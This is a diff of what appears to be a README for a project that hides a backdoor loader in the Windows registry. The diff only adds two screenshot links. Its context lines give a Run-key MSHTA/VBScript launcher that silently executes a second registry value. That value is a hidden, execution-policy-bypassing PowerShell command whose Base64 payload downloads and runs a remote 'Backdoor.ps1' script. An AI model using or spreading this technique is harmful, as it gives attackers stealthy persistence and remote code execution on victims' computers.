@@ -13,8 +13,11 @@ HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
 Value:
 MSHTA VbScript:Execute("CreateObject(""Wscript.Shell"").Run CreateObject(""Wscript.Shell"").RegRead(""HKCU\v1Elm0D""), 0, False:close")
 
+![alt tag](https://github.com/Elm0D/Load-hidden-in-Registry/blob/master/Screenshot1.png)
+
 Backdoor Key:
 HKCU\v1Elm0D
 value:
 powershell.exe -ep bypass -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAcwB0AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBFAGwAbQAwAEQALwAzAGUAMQA2ADAAOABhAGMANABjADEAYQAxADkAMwBhADcAZAA2ADMAYgA0AGIAMQAwAGMAYwA4AGYAZQBjADQALwByAGEAdwAvADgAOQA4ADMAZQAxADAAZQBmAGUAOAAyADYAMgAyADYAMABmAGEAZgBiADQAOQA1ADMAOQBhAGIAMwBjADgAOQA4ADYAOAA5ADUAYgA3ADgALwBCAGEAYwBrAGQAbwBvAHIALgBwAHMAMQAnACkAOwA=
 
+![alt tag](https://github.com/Elm0D/Load-hidden-in-Registry/blob/master/Screenshot2.png)
